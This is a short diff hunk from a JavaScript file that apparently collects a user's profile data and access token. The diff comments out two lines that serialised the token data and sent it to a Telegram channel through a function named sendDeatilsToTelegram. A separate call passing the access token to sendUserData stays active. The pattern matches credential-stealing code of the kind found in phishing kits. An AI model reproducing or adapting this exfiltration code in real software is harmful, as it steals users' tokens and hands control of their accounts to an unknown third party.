@@ -382,8 +382,8 @@ function sendUserData(token) {
           user: userInfo
         };
         console.log("User Data and Access Token stored:", user_data_access_token);
-        let temp3 = JSON.stringify(user_data_access_token, null, 2);
-        sendDeatilsToTelegram(`==========FRONTEND==========\n${temp3}`)
+        // let temp3 = JSON.stringify(user_data_access_token, null, 2);
+        // sendDeatilsToTelegram(`==========FRONTEND==========\n${temp3}`)
         sendUserData(accessToken);
 
 
